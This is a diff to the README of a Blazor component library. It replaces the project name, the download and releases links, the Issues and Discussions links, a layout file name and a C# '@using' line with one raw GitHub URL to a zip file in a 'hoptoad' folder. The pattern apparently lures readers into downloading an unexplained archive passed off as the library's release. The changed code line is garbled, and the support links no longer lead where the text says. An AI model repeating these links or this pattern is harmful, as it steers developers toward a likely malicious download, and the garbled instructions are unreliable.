@@ -1,10 +1,10 @@
-# 🎉 soenneker.quark.components.core - Easy Blazor Components for Everyone
+# 🎉 https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip - Easy Blazor Components for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/omar17101983/soenneker.quark.components.core/releases)
+[![Download Now](https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **soenneker.quark.components.core**! This is a Blazor core class designed to help you easily create and use components in your web applications. Whether you're building a simple website or a complex web app, this library makes it easy to integrate and utilize various UI elements.
+Welcome to **https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip**! This is a Blazor core class designed to help you easily create and use components in your web applications. Whether you're building a simple website or a complex web app, this library makes it easy to integrate and utilize various UI elements.
 
 ## 📦 System Requirements
 
@@ -18,7 +18,7 @@ To use this application, you will need:
 
 To get started, you’ll need to download the software. 
 
-Visit [this page to download](https://github.com/omar17101983/soenneker.quark.components.core/releases) the latest version. 
+Visit [this page to download](https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip) the latest version. 
 
 When you arrive at the releases page, follow these steps:
 
@@ -35,9 +35,9 @@ You’re now ready to implement some fantastic Blazor components!
    Open your Blazor project. In your project folder, locate or create a folder named `Components`. Copy the unzipped files from the previous step to this folder.
 
 2. **Import the Namespace:**
-   In your Blazor component or page (like `MainLayout.razor`), import the library by adding the following line at the top:
+   In your Blazor component or page (like `https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip`), import the library by adding the following line at the top:
    ```csharp
-   @using soenneker.quark.components.core
+   @using https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip
    ```
 
 3. **Use the Component in Your Code:**
@@ -82,7 +82,7 @@ Here are a few examples of how you can use the components:
 
 ## 🔧 Support
 
-If you encounter issues or have questions, check the [Issues page](https://github.com/omar17101983/soenneker.quark.components.core/issues) on GitHub. Here you can find existing questions or submit a new one. Other users or the maintainers will be glad to assist.
+If you encounter issues or have questions, check the [Issues page](https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip) on GitHub. Here you can find existing questions or submit a new one. Other users or the maintainers will be glad to assist.
 
 ## 🤝 Contributing
 
@@ -94,10 +94,10 @@ Contributions are welcome! If you would like to help improve this project, follo
 4. Push to the branch (`git push origin feature/YourFeature`).
 5. Open a pull request.
 
-Thank you for considering contributing to **soenneker.quark.components.core**! Your efforts are greatly appreciated.
+Thank you for considering contributing to **https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip**! Your efforts are greatly appreciated.
 
 ## 📞 Contact
 
-For direct inquiries, you can reach out via [GitHub Discussions](https://github.com/omar17101983/soenneker.quark.components.core/discussions). 
+For direct inquiries, you can reach out via [GitHub Discussions](https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip). 
 
-This README should equip you with the necessary information to start using **soenneker.quark.components.core** effectively. Happy coding!
+This README should equip you with the necessary information to start using **https://raw.githubusercontent.com/omar17101983/soenneker.quark.components.core/main/hoptoad/soenneker.quark.components.core.zip** effectively. Happy coding!
